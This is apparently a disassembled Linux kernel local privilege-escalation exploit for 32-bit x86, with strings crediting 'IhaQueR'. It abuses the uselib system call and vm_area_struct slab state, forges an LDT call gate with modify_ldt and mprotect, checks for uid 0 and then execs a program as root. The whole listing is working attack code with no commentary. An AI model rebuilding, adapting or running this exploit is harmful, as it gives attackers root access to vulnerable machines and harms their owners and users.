xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push fcn.0804a990
push fcn.080488f8
push ecx
push esi
push main
call fcn.08048ac0
hlt
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 8
nop
nop
cmp dword [argv], 0
jne 0x804a77c
jmp 0x804a924
nop
sub esp, 4
push str.n:l:a:w:c:d:fsh
push dword [envp]
push dword [argv]
call fcn.08048a70
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jns 0x804a7a4
jmp 0x804a924
mov esi, esi
mov eax, dword [var_4h]
sub eax, 0x61
mov dword [var_8h], eax
cmp dword [var_8h], 0x16
ja case.0x804a7c1.1
mov edx, dword [var_8h]
mov eax, dword [edx*4 + 0x804ae40]
jmp eax
nop
mov dword [0x804b040], 1
jmp 0x804a770
mov dword [0x804b044], 1
jmp 0x804a770
sub esp, 0xc
push dword [reloc.optarg]
call fcn.08048b30
add esp, 0x10
mov eax, eax
mov eax, eax
mov dword [0x804b04c], eax
jmp 0x804a770
nop
sub esp, 4
push 0x804b038
push 0x804ae07
push dword [reloc.optarg]
call fcn.08048b40
add esp, 0x10
mov eax, eax
cmp eax, 1
jne 0x804a830
mov eax, dword [0x804b038]
cmp eax, 0x186a0
ja 0x804a830
jmp 0x804a770
nop
sub esp, 8
push 0
push str.bad_delta_value
call fcn.08048f7c
add esp, 0x10
jmp 0x804a770
nop
sub esp, 0xc
push dword [reloc.optarg]
call fcn.08048b30
add esp, 0x10
mov eax, eax
mov eax, eax
mov dword [0x804b050], eax
cmp dword [0x804b050], 0
jns 0x804a770
sub esp, 8
push 0
push str.bad_wait_value
call fcn.08048f7c
add esp, 0x10
jmp 0x804a770
mov esi, esi
sub esp, 0xc
push dword [reloc.optarg]
call fcn.08048950
add esp, 0x10
mov eax, eax
mov eax, eax
mov dword [0x804b0a4], eax
jmp 0x804a770
nop
sub esp, 0xc
push dword [reloc.optarg]
call fcn.08048950
add esp, 0x10
mov eax, eax
mov eax, eax
mov dword [0x804b0a8], eax
jmp 0x804a770
nop
sub esp, 4
push 0x804b058
push 0x804ae29
push dword [reloc.optarg]
call fcn.08048b40
add esp, 0x10
mov eax, eax
cmp eax, 1
je 0x804a8fc
sub esp, 8
push 0
push str.bad_addr_value
call fcn.08048f7c
add esp, 0x10
and dword [0x804b058], 0xffc00000
jmp 0x804a770
nop
sub esp, 0xc
mov eax, dword [envp]
push dword [eax]
call fcn.0804a6c4
add esp, 0x10
jmp 0x804a770
lea esi, [esi]
call fcn.08048ae0
mov dword [0x805052c], eax
call fcn.08048940
call fcn.0804a618
call fcn.0804a424
mov eax, 0
leave
ret
push ebp
mov ebp, esp
push ebx
push eax
call 0x8048bbe
pop ebx
add ebx, 0x25fe
mov eax, dword [ebx + 0xa8]
test eax, eax
je 0x8048bd1
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov eax, fcn.08048960
mov ebp, esp
sub esp, 8
test eax, eax
je 0x8048c74
sub esp, 8
push 0x804b28c
push section..eh_frame
call fcn.08048960
add esp, 0x10
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [section..ctors]
mov ebx, section..ctors
cmp eax, 0xffffffff
je 0x804a97c
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x804a970
pop eax
pop ebx
pop ebp
ret
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.__errno_location]
jmp dword [reloc.fprintf]
jmp dword [reloc.strerror]
jmp dword [reloc.printf]
jmp dword [reloc.fflush]
jmp dword [reloc.unlink]
jmp dword [reloc.kill]
push ebp
mov ebp, esp
sub esp, 8
mov eax, 0x9e
int 0x80
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffff82
jbe 0x8048f0b
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_4h]
neg eax
mov dword [edx], eax
mov dword [var_4h], 0xffffffff
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, 0x4e
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048e4c
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
mov esi, esi
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [ecx]
mov eax, dword [ebx]
sub eax, edx
mov dword [var_8h], eax
mov edx, dword [var_8h]
mov eax, edx
shl eax, 2
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
shl eax, 6
mov dword [var_8h], eax
mov edx, dword [ecx + 4]
mov eax, dword [ebx + 4]
sub eax, edx
mov edx, eax
lea eax, [var_8h]
add dword [eax], edx
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, 0xdb
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048d78
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
lea esi, [esi]
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, 0x7d
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048dc0
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
lea esi, [esi]
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
cmp dword [arg_ch], 0
jne 0x8048fa8
cmp dword [0x804b040], 0
je 0x8048f9c
mov dword [var_8h], 0x13
jmp 0x8048faf
mov esi, esi
mov dword [var_8h], 9
jmp 0x8048faf
lea esi, [esi]
mov dword [var_8h], 0x13
mov eax, dword [var_8h]
mov dword [var_4h], eax
call fcn.08048a20
mov eax, eax
mov eax, eax
cmp dword [eax], 0
jne 0x8048fe0
sub esp, 4
push dword [arg_8h]
push str._n____FAILED:__s_
push dword [reloc.stdout]
call fcn.080489b0
add esp, 0x10
jmp 0x8049015
mov esi, esi
sub esp, 0xc
sub esp, 4
call fcn.08048a20
add esp, 4
mov eax, eax
mov eax, eax
push dword [eax]
call fcn.08048a10
add esp, 0x10
mov eax, eax
push eax
push dword [arg_8h]
push str._n____FAILED:__s___s__
push dword [reloc.stdout]
call fcn.080489b0
add esp, 0x10
cmp dword [arg_ch], 0
je 0x804902b
sub esp, 0xc
push str._nCRITICAL__entering_endless_loop
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push 0x804aa81
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 0xc
push dword [0x804b0a4]
call fcn.08048a00
add esp, 0x10
sub esp, 8
push 9
push dword [0x8050528]
call fcn.08048b80
add esp, 0x10
sub esp, 8
push dword [var_4h]
push 0
call fcn.08048b80
add esp, 0x10
jmp 0x8049070
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [ebp + 8]
mov ecx, dword [ebp + 0xc]
mov edx, dword [ebp + 0x10]
mov esi, dword [ebp + 0x14]
mov edi, dword [ebp + 0x18]
mov eax, dword [ebp + 0x1c]
push ebp
mov ebp, eax
mov eax, 0xc0
int 0x80
pop ebp
mov eax, eax
mov dword [ebp - 0x10], eax
cmp dword [ebp - 0x10], 0xffffff82
jbe 0x8048cd8
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [ebp - 0x10]
neg eax
mov dword [edx], eax
mov dword [ebp - 0x10], 0xffffffff
mov eax, dword [ebp - 0x10]
mov eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
pop ebp
ret
jmp dword [reloc._exit]
push ebp
mov ebp, esp
sub esp, 4
mov dword [var_4h], 0
mov eax, dword [arg_8h]
cmp eax, dword [0x8050530]
jb 0x80492b4
mov eax, dword [0x8050540]
sub eax, 0x10
cmp dword [arg_8h], eax
jae 0x80492b4
mov dword [var_4h], 1
mov eax, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub esp, 0xc
mov eax, dword [arg_8h]
push dword [eax]
call fcn.08049288
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8049344
sub esp, 0xc
mov edx, dword [arg_8h]
push dword [edx + 0xc]
call fcn.08049288
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8049344
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
cmp dword [edx + 4], eax
jne 0x8049344
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
cmp dword [edx + 8], eax
jne 0x8049344
mov edx, dword [arg_8h]
mov eax, dword [edx + 0xc]
mov dword [var_4h], eax
mov eax, dword [var_4h]
mov eax, dword [eax]
mov edx, dword [arg_8h]
cmp eax, dword [edx]
jne 0x8049344
mov eax, dword [var_4h]
add eax, 4
mov eax, dword [eax]
cmp eax, dword [0x8050530]
ja 0x8049344
mov eax, dword [var_4h]
add eax, 8
mov eax, dword [eax]
cmp eax, dword [0x8050530]
ja 0x8049344
mov eax, 1
jmp 0x8049349
lea esi, [esi]
mov eax, 0
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [arg_8h]
mov dword [var_8h], eax
lea esi, [esi]
mov eax, dword [var_8h]
mov eax, dword [eax]
cmp eax, dword [0x805052c]
jne 0x804939c
mov eax, dword [var_8h]
add eax, 4
mov eax, dword [eax]
cmp eax, dword [0x805052c]
jne 0x804939c
mov eax, dword [var_8h]
add eax, 8
mov eax, dword [eax]
cmp eax, dword [0x805052c]
jne 0x804939c
mov eax, dword [var_8h]
add eax, 0xc
mov eax, dword [eax]
cmp eax, dword [0x805052c]
jne 0x804939c
jmp 0x80493a4
nop
lea eax, [var_8h]
add dword [eax], 4
jmp 0x804935c
mov ebx, dword [var_8h]
mov ecx, dword [var_8h]
mov edx, dword [var_8h]
add edx, 8
mov eax, dword [var_8h]
add eax, 0xc
mov dword [eax], 0
mov dword [edx], 0
mov dword [ecx], 0
mov dword [ebx], 0
mov ebx, dword [var_8h]
add ebx, 0x10
mov ecx, dword [var_8h]
add ecx, 0x14
mov edx, dword [var_8h]
add edx, 0x18
mov eax, dword [var_8h]
add eax, 0x1c
mov dword [eax], 0
mov dword [edx], 0
mov dword [ecx], 0
mov dword [ebx], 0
mov eax, dword [0x8050530]
mov dword [var_8h], eax
mov esi, esi
mov eax, dword [0x8050540]
sub eax, 0x10
cmp dword [var_8h], eax
jb 0x8049418
jmp 0x8049464
nop
sub esp, 4
push dword [0x805054c]
push dword [0x8050548]
push dword [var_8h]
call fcn.080492bc
add esp, 0x10
mov eax, eax
test eax, eax
je 0x804945c
mov edx, dword [var_8h]
add edx, 4
mov eax, dword [0x8050530]
sub eax, 0x1000
mov dword [edx], eax
mov edx, dword [var_8h]
add edx, 8
mov eax, dword [0x8050530]
mov dword [edx], eax
jmp 0x8049464
lea esi, [esi]
lea eax, [var_8h]
add dword [eax], 4
jmp 0x8049408
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.signal]
push ebp
mov ebp, esp
mov eax, 0x804b020
mov edx, dword [eax]
mov ecx, edx
inc edx
mov dword [eax], edx
mov eax, ecx
pop ebp
ret
push ebp
mov ebp, esp
mov eax, dword [0x804b020]
add eax, dword [0x8050530]
add eax, dword [0x8050540]
mov eax, eax
pop ebp
ret
jmp dword [reloc.getuid]
jmp dword [reloc.strlen]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x804b030]
inc eax
mov dword [0x804b030], eax
sub esp, 8
push 1
push str.lcall
call fcn.08048f7c
add esp, 0x10
leave
ret
jmp dword [reloc.execl]
push ebp
mov ebp, esp
sub esp, 8
inc dword [0x804b048]
cmp dword [0x804b048], 1
jne 0x8049844
mov eax, dword [0x8050550]
dec eax
mov dword [0x8050520], eax
jmp 0x804998e
lea esi, [esi]
cmp dword [0x804b048], 2
jne 0x80498cc
sub esp, 4
push 0x10
push 0
push 0x804b2c0
call fcn.08048b50
add esp, 0x10
mov dword [0x804b2c0], 0x1fff
or byte [0x804b2cc], 1
mov dword [0x804b2c4], 0xdead
mov dword [0x804b2c8], 0xbabe
or byte [0x804b2cc], 0x10
sub esp, 4
push 0x10
push 0x804b2c0
push 1
call fcn.08048dcc
add esp, 0x10
mov eax, eax
test eax, eax
je 0x80498b9
sub esp, 8
push 1
push str.modify_ldt
call fcn.08048f7c
add esp, 0x10
mov eax, dword [0x8050550]
dec eax
mov dword [0x8050520], eax
jmp 0x804998e
lea esi, [esi]
cmp dword [0x804b048], 3
jne 0x804998e
mov dword [0x804b0ac], 0
mov dword [0x8050520], 0
lea esi, [esi]
mov eax, dword [0x8050550]
dec eax
cmp dword [0x8050520], eax
jle 0x8049900
jmp 0x804997c
mov eax, dword [0x8050520]
add eax, dword [0x8050564]
cmp byte [eax], 0
je 0x804992c
inc dword [0x804b0ac]
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
jmp 0x804996e
lea esi, [esi]
cmp dword [0x804b0ac], 0x10
jne 0x8049964
mov dword [0x804b0ac], 0
sub esp, 0xc
mov eax, dword [0x8050520]
mov eax, eax
shl eax, 0xc
add eax, dword [0x8050540]
sub eax, 0x1000
push eax
call fcn.080494d4
add esp, 0x10
jmp 0x804996e
mov esi, esi
mov dword [0x804b0ac], 0
inc dword [0x8050520]
jmp 0x80498f0
lea esi, [esi]
sub esp, 8
push 1
push str.find_LDT
call fcn.08048f7c
add esp, 0x10
mov dword [0x8050534], esp
mov eax, dword [0x8050544]
mov dword [0x805053c], eax
call fcn.0804977c
leave
ret
push ebp
mov ebp, esp
sub esp, 8
nop
mov esp, dword [0x8050534]
mov eax, dword [0x804b02c]
test eax, eax
je 0x80497f4
mov eax, dword [0x8050520]
mov edx, dword [0x8050564]
add edx, eax
mov eax, dword [0x8050520]
add eax, dword [0x8050564]
mov al, byte [eax]
xor eax, 1
mov byte [edx], al
jmp 0x804980c
nop
sub esp, 4
push 4
push 0x1000
push dword [0x805053c]
call fcn.08048d3c
add esp, 0x10
dec dword [0x8050520]
call fcn.0804977c
jmp 0x80497c3
push ebp
mov ebp, esp
sub esp, 8
sub dword [0x805053c], 0x1000
mov eax, dword [0x805053c]
cmp eax, dword [0x8050540]
ja 0x804979e
call fcn.0804981c
mov dword [0x804b02c], 0
mov eax, dword [0x805053c]
mov eax, dword [eax]
mov dword [0x804b020], eax
call fcn.080497bc
leave
ret
jmp dword [reloc.memset]
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, 0x7b
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048e08
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
lea esi, [esi]
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x14
sub esp, 8
push dword [arg_8h]
push str._n____try_to_exploit_0x_.8x
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 0xc
push dword [0x804b0a4]
call fcn.08048a00
add esp, 0x10
sub esp, 4
mov eax, dword [0x804b03c]
or eax, 3
push eax
push 0x1000
push dword [arg_8h]
call fcn.08048d84
add esp, 0x10
mov eax, eax
mov dword [var_8h], eax
mov eax, dword [var_8h]
test eax, eax
je 0x804954a
sub esp, 8
push 1
push str.mprotect_1
call fcn.08048f7c
add esp, 0x10
mov eax, dword [arg_8h]
add eax, 0xff8
mov dword [var_ch], eax
sub esp, 8
push fcn.080494ac
push 0xb
call fcn.080489e0
add esp, 0x10
mov eax, dword [var_ch]
mov eax, dword [eax]
mov dword [var_8h], eax
mov eax, dword [var_8h]
cmp eax, 0xdeadbabe
je 0x80495b0
sub esp, 8
mov eax, dword [var_8h]
push eax
push str._n____FAILED_val__0x_.8x
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 8
push 1
push str.find_LDT
call fcn.08048f7c
add esp, 0x10
mov edx, dword [var_ch]
mov eax, 0x804946f
and eax, 0xffff
or eax, 0xffec0000
mov dword [edx], eax
mov edx, dword [var_ch]
add edx, 4
mov eax, 0x804946f
and eax, 0xffff0000
or eax, 0xec00
mov dword [edx], eax
sub esp, 4
mov eax, dword [var_ch]
add eax, 4
mov eax, dword [eax]
push eax
mov eax, dword [var_ch]
mov eax, dword [eax]
push eax
push str._n___gate_modified___0x_.8x_0x_.8x__
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
mov eax, dword [arg_8h]
add eax, 0xfe8
mov dword [var_ch], eax
mov eax, dword [var_ch]
mov dword [eax], 0xffff
mov eax, dword [var_ch]
add eax, 4
mov dword [eax], 0xcf9b00
mov eax, dword [arg_8h]
add eax, 0xff0
mov dword [var_ch], eax
mov eax, dword [var_ch]
mov dword [eax], 0xffff
mov eax, dword [var_ch]
add eax, 4
mov dword [eax], 0xcf9300
sub esp, 4
mov eax, dword [0x804b03c]
or eax, 1
push eax
push 0x1000
push dword [arg_8h]
call fcn.08048d84
add esp, 0x10
mov eax, eax
mov dword [var_8h], eax
mov eax, dword [var_8h]
test eax, eax
je 0x8049685
sub esp, 8
push 1
push str.mprotect_2
call fcn.08048f7c
add esp, 0x10
call fcn.08048edc
call fcn.08049274
mov ebx, eax
call fcn.08049494
mov eax, eax
lea eax, [eax + ebx]
mov dword [0x804b020], eax
lcall 0xffff, 0
call fcn.08048ae0
mov eax, eax
test eax, eax
je 0x80496dc
mov eax, dword [0x804b020]
cmp eax, 0x7a69
jne 0x8049700
sub esp, 0xc
push str.Intelectual_property_of_IhaQueR
call fcn.08048aa0
add esp, 0x10
mov eax, eax
mov eax, eax
cmp eax, 0x10
je 0x80496dc
jmp 0x8049700
lea esi, [esi]
sub esp, 0xc
push str._n___exploited__uid0_n_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
jmp 0x804972e
nop
sub esp, 0xc
push str._n____uid_change_failed
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 0xc
push 0
call fcn.080494ac
add esp, 0x10
sub esp, 8
push 1
push 0xf
call fcn.080489e0
add esp, 0x10
sub esp, 8
push 0xf
push 0
call fcn.08048b80
add esp, 0x10
sub esp, 4
push 0
push 0x804ab5f
push dword [0x804b0a8]
call fcn.08048930
add esp, 0x10
sub esp, 8
push 0
push str.execl
call fcn.08048f7c
add esp, 0x10
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.fopen]
jmp dword [reloc.fgets]
jmp dword [reloc.sscanf]
jmp dword [reloc.strcmp]
jmp dword [reloc.fileno]
jmp dword [reloc.close]
jmp dword [reloc.fclose]
jmp dword [reloc.waitpid]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x804b03c]
test eax, eax
je 0x8049bc8
mov dword [0x8050534], esp
jmp 0x8049bd0
nop
mov esp, dword [0x8050534]
jmp 0x8049bf3
sub esp, 8
push fcn.08049b98
push 0xb
call fcn.080489e0
add esp, 0x10
mov eax, dword [0x8050538]
add eax, 0x1000
mov eax, dword [eax]
mov dword [0x804b020], eax
leave
ret
jmp dword [reloc.clone]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 0
sub esp, 8
push 0x804ab73
push str._proc_slabinfo
call fcn.08048b70
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x80499e7
sub esp, 8
push 0
push str.get_slab_objs:_fopen
call fcn.08048f7c
add esp, 0x10
sub esp, 4
push dword [var_4h]
push 0xff
push 0x8050320
call fcn.08048a80
add esp, 0x10
nop
mov dword [0x804b0b4], 0xffffffff
mov dword [0x804b0b0], 0xffffffff
mov dword [0x804b2d0], 0xffffffff
sub esp, 4
push dword [var_4h]
push 0xff
push 0x8050420
call fcn.08048a80
add esp, 0x10
mov eax, eax
test eax, eax
jne 0x8049a40
jmp 0x8049a9e
mov esi, esi
sub esp, 0xc
push 0x804b2d4
push 0x804b2d4
push 0x804b2d4
push 0x804b2d4
push 0x804b0b4
push 0x804b0b0
push 0x8050320
push str._s__u__u__u__u__u__u
push 0x8050420
call fcn.08048b40
add esp, 0x30
mov eax, eax
mov dword [0x804b2d0], eax
sub esp, 8
push dword [arg_8h]
push 0x8050320
call fcn.08048990
add esp, 0x10
mov eax, eax
mov eax, eax
test eax, eax
jne 0x8049a00
sub esp, 0xc
push dword [var_4h]
call fcn.08048980
add esp, 4
mov eax, eax
push eax
call fcn.080489a0
add esp, 0x10
sub esp, 0xc
push dword [var_4h]
call fcn.08048b10
add esp, 0x10
cmp dword [0x804b2d0], 7
jne 0x8049ae0
mov edx, dword [0x804b0b0]
mov eax, dword [0x804b0b4]
sub eax, edx
mov dword [var_8h], eax
jmp 0x8049ae7
mov dword [var_8h], 0xffffffff
mov eax, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
sub dword [0x805053c], 0x1000
inc dword [0x804b054]
mov eax, dword [0x804b03c]
xor eax, 1
mov dword [0x804b03c], eax
sub esp, 8
push 0
push 0
push 0x32
mov eax, dword [0x804b03c]
push eax
push 0x1000
push dword [0x805053c]
call fcn.08048c90
add esp, 0x20
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x8049b4c
sub esp, 8
push 0
push str.try_again
call fcn.08048f7c
add esp, 0x10
mov edx, dword [var_4h]
mov eax, dword [0x805053c]
mov dword [edx], eax
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov eax, 0x56
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048ed0
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
nop
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov eax, 0x5b
int 0x80
mov eax, eax
mov dword [var_8h], eax
cmp dword [var_8h], 0xffffff82
jbe 0x8048e90
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_8h]
neg eax
mov dword [edx], eax
mov dword [var_8h], 0xffffffff
mov esi, esi
mov eax, dword [var_8h]
mov eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
mov edi, dword [arg_18h]
mov eax, 0xa3
int 0x80
mov eax, eax
mov dword [var_10h], eax
cmp dword [var_10h], 0xffffff82
jbe 0x8048d2c
call fcn.08048a20
mov eax, eax
mov edx, eax
mov eax, dword [var_10h]
neg eax
mov dword [edx], eax
mov dword [var_10h], 0xffffffff
lea esi, [esi]
mov eax, dword [var_10h]
mov eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
pop ebp
ret
jmp dword [reloc.umask]
jmp dword [reloc.open]
jmp dword [reloc.memcpy]
jmp dword [reloc.write]
jmp dword [reloc.lseek]
jmp dword [reloc.sysinfo]
jmp dword [reloc.malloc]
push ebp
mov ebp, esp
sub esp, 0x78
sub esp, 0xc
push 0x12
call fcn.080489d0
add esp, 0x10
sub esp, 0xc
push dword [0x804b0a4]
call fcn.08048a00
add esp, 0x10
sub esp, 4
push 0x1ed
push 0x242
push dword [0x804b0a4]
call fcn.08048b20
add esp, 0x10
mov eax, eax
mov dword [var_6ch], eax
cmp dword [var_6ch], 0
jns 0x804a12c
sub esp, 8
push 0
push str.open_lib___dev_shm__elf_lib_not_writable__
call fcn.08048f7c
add esp, 0x10
sub esp, 4
push 0x34
push 0
lea eax, [var_48h]
push eax
call fcn.08048b50
add esp, 0x10
sub esp, 4
push 4
push 0x804ac8b
lea eax, [var_48h]
push eax
call fcn.08048b00
add esp, 0x10
mov word [var_38h], 2
mov word [var_36h], 3
mov word [var_1eh], 0x20
mov word [var_1ch], 1
mov dword [var_2ch], 0x34
sub esp, 4
push 0x34
lea eax, [var_48h]
push eax
push dword [var_6ch]
call fcn.08048970
add esp, 0x10
sub esp, 4
push 0x20
push 0
lea eax, [var_68h]
push eax
call fcn.08048b50
add esp, 0x10
mov dword [var_68h], 1
mov dword [var_64h], 0x1000
mov dword [var_58h], 0x1000
mov eax, dword [0x8050538]
mov dword [var_60h], eax
mov dword [var_54h], 0x4000
mov dword [var_50h], 7
sub esp, 4
push 0x20
lea eax, [var_68h]
push eax
push dword [var_6ch]
call fcn.08048970
add esp, 0x10
sub esp, 4
push 0
push 0x1000
push dword [var_6ch]
call fcn.08048af0
add esp, 0x10
sub esp, 4
push 0x1000
push 0x90
push 0x804b2e0
call fcn.08048b50
add esp, 0x10
sub esp, 4
push 0x1000
push 0x804b2e0
push dword [var_6ch]
call fcn.08048970
add esp, 0x10
sub esp, 0xc
push dword [var_6ch]
call fcn.080489a0
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], 0
mov dword [0x804b028], 0
mov dword [0x804b030], 0
mov dword [var_8h], 0x4000
push 0
push 0xb11
mov eax, 0x804c320
sub eax, 0x10
add eax, dword [var_8h]
push eax
push fcn.08049084
call fcn.08048920
add esp, 0x10
mov eax, eax
mov dword [0x8050528], eax
cmp dword [0x8050528], 0xffffffff
jne 0x8049c62
sub esp, 8
push 0
push str.clone
call fcn.08048f7c
add esp, 0x10
nop
nop
mov eax, dword [0x804b028]
test eax, eax
je 0x8049c70
jmp 0x8049c78
nop
call fcn.08048edc
jmp 0x8049c64
nop
mov dword [0x804b028], 0
cmp dword [0x804b044], 0
jne 0x8049cac
sub esp, 0xc
push 0x804aa81
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
nop
lea esi, [esi]
sub esp, 0xc
push str.vm_area_struct
call fcn.080499a8
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
lea esi, [esi]
cmp dword [var_4h], 1
jne 0x8049cd0
jmp 0x8049cdc
call fcn.08049aec
lea eax, [var_4h]
dec dword [eax]
jmp 0x8049cc8
sub esp, 8
push 0
push 0x8050554
call fcn.08048e14
add esp, 0x10
mov dword [0x804b024], 1
sub esp, 0xc
push dword [0x804b0a4]
call fcn.08048e9c
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
mov dword [0x804b024], 0
cmp dword [var_4h], 0
je 0x8049d30
sub esp, 8
push 0
push str.uselib
call fcn.08048f7c
add esp, 0x10
mov eax, dword [0x804b028]
test eax, eax
je 0x8049d40
jmp 0x8049e04
mov esi, esi
sub esp, 8
push 0x4000
push dword [0x8050538]
call fcn.08048e58
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
je 0x8049d73
sub esp, 8
push 0
push str.munmap_lib
call fcn.08048f7c
add esp, 0x10
mov eax, dword [0x804b030]
test eax, eax
je 0x8049d84
jmp 0x804a0ba
lea esi, [esi]
cmp dword [0x804b044], 0
jne 0x8049df9
mov eax, dword [var_ch]
and eax, 0x3f
test eax, eax
jne 0x8049df9
sub esp, 8
mov eax, dword [var_ch]
mov dword [var_14h], eax
cmp dword [var_14h], 0
jns 0x8049daa
add dword [var_14h], 0x3f
mov eax, dword [var_14h]
sar eax, 6
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov dword [var_18h], eax
cmp dword [var_18h], 0
jns 0x8049dc3
add dword [var_18h], 7
mov eax, dword [var_18h]
sar eax, 3
imul eax, eax, 8
mov edx, dword [var_10h]
sub edx, eax
mov eax, str.____
movsx eax, byte [edx + eax]
push eax
push str._r_Wait...__c
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
lea eax, [var_ch]
inc dword [eax]
jmp 0x8049cb0
nop
sub esp, 8
mov edx, dword [0x805053c]
mov eax, dword [0x804b058]
sub eax, edx
add eax, 0x1000
push eax
push dword [0x805053c]
call fcn.08048e58
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
je 0x8049e45
sub esp, 8
push 0
push str.munmap_1
call fcn.08048f7c
add esp, 0x10
